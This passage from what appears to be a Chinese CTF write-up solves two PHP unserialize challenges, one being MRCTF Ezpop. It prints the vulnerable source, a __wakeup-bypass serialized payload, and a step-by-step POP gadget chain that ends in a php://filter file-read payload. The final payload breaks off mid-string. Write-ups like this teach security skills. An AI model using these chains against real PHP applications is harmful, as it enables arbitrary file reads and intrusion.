    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 640px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token prolog">&lt;?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 5%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 99%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">font</span><span class="token punctuation">:</span>italic 15px Georgia<span class="token punctuation">,</span>serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre>

<p>class.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p>
<p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>传入即可</p>
<hr>
<h3 id="MRCTF—Ezpop"><a href="#MRCTF—Ezpop" class="headerlink" title="MRCTF—Ezpop"></a>MRCTF—Ezpop</h3><p>题目源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>一步步审计代码</p>
<p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p>
<p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p>
<p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">public function __invoke()&#123;
    $this-&gt;append($this-&gt;var);
&#125;</code></pre>

<p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span></code></pre>

<p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span></code></pre>

<p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span></code></pre>

<p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span></code></pre>

<p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>于是最总payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00*%00var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=./flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string 